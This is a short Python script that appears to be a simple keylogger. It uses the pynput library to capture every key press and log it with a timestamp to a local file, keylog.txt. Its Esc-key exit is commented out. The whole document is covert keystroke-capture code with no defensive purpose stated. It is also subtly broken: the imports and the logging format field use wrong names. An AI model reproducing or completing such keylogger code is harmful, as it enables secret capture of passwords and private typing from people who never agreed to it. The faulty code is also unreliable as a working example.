

#library from github
from pynput.keyboard import key,listener
#vanilla module
import logging


#make a log file 

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(messages)s :')


#define fuction

def on_press(key):
    logging.info(str(key))
    #if key == key.esc:
        #return False

with listener(on_press=on_press) as listener:
    listener.join()
